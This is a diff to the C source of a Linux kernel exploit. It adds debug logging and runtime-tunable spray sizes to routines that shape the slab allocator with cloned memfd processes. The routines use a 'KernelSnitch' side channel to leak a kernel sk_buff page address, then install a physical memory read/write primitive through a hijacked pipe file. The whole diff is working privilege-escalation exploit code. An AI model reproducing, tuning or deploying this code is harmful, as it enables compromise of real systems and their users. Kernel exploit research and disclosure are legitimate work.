@@ -116,27 +116,43 @@ void shape_pipe_cache(void) {
 }
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
+  pr_info("pipe child prepare begin\n");
   struct mm_ctx prep;
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
 
-  init_ctx(&prep, 32 * objs_per_slab);
-  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
+  /* Clone-storm scale knobs: prep defaults to the proven 32 slabs, spray
+   * to (1+MM_PARTIALS). Both are runtime-tunable so the panic hunt can
+   * trade shaping fidelity for allocator pressure without rebuilds. */
+  int prep_slabs = env_int_range("PIPE_PREP_SLABS", 32, 0, 32);
+  int spray_slabs =
+    env_int_range("PIPE_SPRAY_SLABS", 1 + MM_PARTIALS, 0, 1 + MM_PARTIALS);
+  init_ctx(&prep, (size_t)prep_slabs * objs_per_slab);
+  init_ctx(&spray, (size_t)spray_slabs * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
+    if ((i & 127) == 127) {
+      pr_info("pipe child prep clone %zu/%zu\n", i + 1, prep.mm_cnt);
+    }
   }
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     spray.childs[i] = -1;
     spray.memfds[i] = clone_memfd();
+    if ((i & 127) == 127) {
+      pr_info("pipe child spray clone %zu/%zu\n", i + 1, spray.mm_cnt);
+    }
   }
 
+  pr_info("pipe child mmfd spray ready prep=%zu spray=%zu\n",
+          prep.mm_cnt, spray.mm_cnt);
   setup_kernelsnitch();
+  pr_info("pipe child kernelsnitch setup done\n");
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
@@ -148,6 +164,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     post.memfds[i] = clone_memfd();
   }
   int leak_memfd = open_memfd(leak_child);
+  pr_info("pipe child leak slab ready pre=%zu post=%zu\n",
+          pre.mm_cnt, post.mm_cnt);
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
@@ -163,6 +181,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
+  pr_info("pipe child collisions ready=%d\n",
+          kernelsnitch_collisions_ready());
 
   unsigned char *buf = malloc(SKB_SEND_SIZE);
   memset(buf, 0x50, SKB_SEND_SIZE);
@@ -183,6 +203,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
+  pr_info("pipe child skb seed sent\n");
   pin_to_core(CORE);
 
   sched_yield();
@@ -210,6 +231,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
+  pr_info("pipe child kernelsnitch cleanup leaked=%016zx\n", leaked);
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
   }
@@ -615,23 +637,30 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
 int g_physrw_fd = -1;
 
 int install_pipe_physrw(int fd) {
+  pr_info("phys install begin fd=%d page=%016zx\n", fd, page_base);
   /* dup to a high number: survives exploit cleanup closes; the dup
    * shares the same struct file, hence the hijacked fops primitive */
   int dup_fd = fcntl(fd, F_DUPFD, 2000);
   g_physrw_fd = (dup_fd >= 0) ? dup_fd : fd;
   if (pipebuf_page_base == 0) {
+    pr_info("phys install requesting pipe page\n");
     atomic_store(&pipe_prepare_done, 0);
     atomic_store(&pipe_prepare_request, 1);
     while (!atomic_load(&pipe_prepare_done)) {
       usleep(10000);
     }
+    pr_info("phys install pipe page ready base=%016zx\n", pipebuf_page_base);
   }
 
   uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
   uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
   if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
+    pr_info("phys install proof translation mismatch proof=%016zx direct=%016zx\n",
+            proof_addr, proof_page);
     return 0;
   }
+  pr_info("phys install proof translation ok proof=%016zx direct=%016zx\n",
+          proof_addr, proof_page);
   if (!pipe_reclaim_cache_gate(fd)) {
     pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
             candidate_slab_cache, kmalloc_pipe_cache);
